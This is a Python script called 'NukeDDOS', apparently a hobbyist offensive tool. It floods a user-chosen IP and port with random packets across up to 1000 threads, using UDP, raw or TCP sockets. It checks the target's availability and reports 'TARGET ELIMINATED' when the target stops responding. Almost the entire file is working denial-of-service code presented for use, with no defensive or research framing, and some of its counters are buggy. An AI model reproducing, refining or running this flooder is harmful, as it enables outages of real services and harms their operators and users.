#!/usr/bin/env python3
import os
import time
import socket
import random
import threading
import struct
import subprocess
from itertools import cycle

# ===== CONSTANTS =====
PACKET_TYPES = (
    ("UDP", socket.SOCK_DGRAM),
    ("RAW", socket.SOCK_RAW),
    ("ICMP", socket.SOCK_RAW),
    ("TCP", socket.SOCK_STREAM)
)

# ===== VISUALIZATION =====
class AttackVisualizer:
    def __init__(self):
        self.spinner = cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        self.last_update = 0
        self.packet_count = 0
        self.speed = 0
        self.lock = threading.Lock()
    
    def update_display(self, completion, target_status):
        now = time.time()
        with self.lock:
            # Calculate packets per second
            if self.last_update > 0:
                self.speed = self.packet_count / (now - self.last_update)
            self.last_update = now
            self.packet_count = 0
            
            # Progress bar with color coding
            bar_length = 40
            filled = int(bar_length * completion / 100)
            progress_bar = (f"\033[92m█\033[0m" * filled +  # Green for progress
                          f"\033[91m-\033[0m" * (bar_length - filled))  # Red for remaining
            
            # Status display
            status = (f"\r\033[K{next(self.spinner)} Attacking {target_ip}:{target_port} | "
                     f"Packets: {self.packet_count:,} | "
                     f"Speed: {self.speed:,.0f} pkt/s | "
                     f"Progress: {progress_bar} {completion:.1f}% | "
                     f"Status: {'\033[91mDOWN\033[0m' if not target_status else '\033[92mUP\033[0m'}")
            print(status, end='', flush=True)
    
    def increment_counter(self):
        with self.lock:
            self.packet_count += 1

# ===== CORE ATTACK =====
def launch_attack(ip, port, packet_type, visualizer):
    sock_type = PACKET_TYPES[packet_type][1]
    proto = socket.IPPROTO_UDP if packet_type == 0 else 0
    
    try:
        with socket.socket(socket.AF_INET, sock_type, proto) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            data = random._urandom(1024)
            
            while attack_active.is_set():
                try:
                    s.sendto(data + struct.pack('>I', random.randint(1, 0xffffffff)), (ip, port))
                    visualizer.increment_counter()
                except socket.error:
                    continue
    except Exception as e:
        print(f"\nAttack error: {str(e)}")

# ===== TARGET MONITOR =====
def monitor_target(ip, port, visualizer):
    baseline = check_target_health(ip, port)
    max_packets = 100000  # Simulation target for 100%
    
    while attack_active.is_set():
        current_health = check_target_health(ip, port)
        completion = min(100, (1 - (current_health / baseline)) * 100) if baseline > 0 else 100
        
        visualizer.update_display(completion, current_health > 0.2)
        
        if current_health < 0.1:  # Target is down
            print("\n\033[91mTARGET ELIMINATED!\033[0m")
            break
        time.sleep(0.5)

def check_target_health(ip, port, samples=5):
    successful_checks = 0
    for _ in range(samples):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    successful_checks += 1
        except:
            continue
    return successful_checks / samples

# ===== MAIN =====
if __name__ == "__main__":
    os.system("clear && figlet -f slant NukeDDOS")
    print("Author: Laila19 | github.com/lailacypher\n")
    
    # Get target info
    target_ip = input("Target IP: ").strip()
    target_port = int(input("Target Port: ").strip())
    threads = min(int(input("Threads (1-1000): ").strip()), 1000)
    
    # Verify target
    if not check_target_health(target_ip, target_port):
        print("\033[91mTarget not responding! Verify IP/Port\033[0m")
        exit()
    
    # Packet type selection
    print("\nSelect attack method:")
    for i, (name, _) in enumerate(PACKET_TYPES):
        print(f"{i+1}. {name}")
    packet_type = int(input("Choice (1-4): ")) - 1
    
    # Initialize components
    attack_active = threading.Event()
    attack_active.set()
    visualizer = AttackVisualizer()
    
    # Start attack threads
    print("\n\033[93mInitializing attack...\033[0m")
    time.sleep(1)
    
    for _ in range(threads):
        threading.Thread(
            target=launch_attack,
            args=(target_ip, target_port, packet_type, visualizer),
            daemon=True
        ).start()
    
    # Start monitoring
    threading.Thread(
        target=monitor_target,
        args=(target_ip, target_port, visualizer),
        daemon=True
    ).start()
    
    # Main control loop
    try:
        while attack_active.is_set():
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\033[93mStopping attack...\033[0m")
        attack_active.clear()
        time.sleep(1)  # Allow threads to exit
    
    print("\nAttack terminated. Final stats:")
    visualizer.update_display(100, False)
    print()
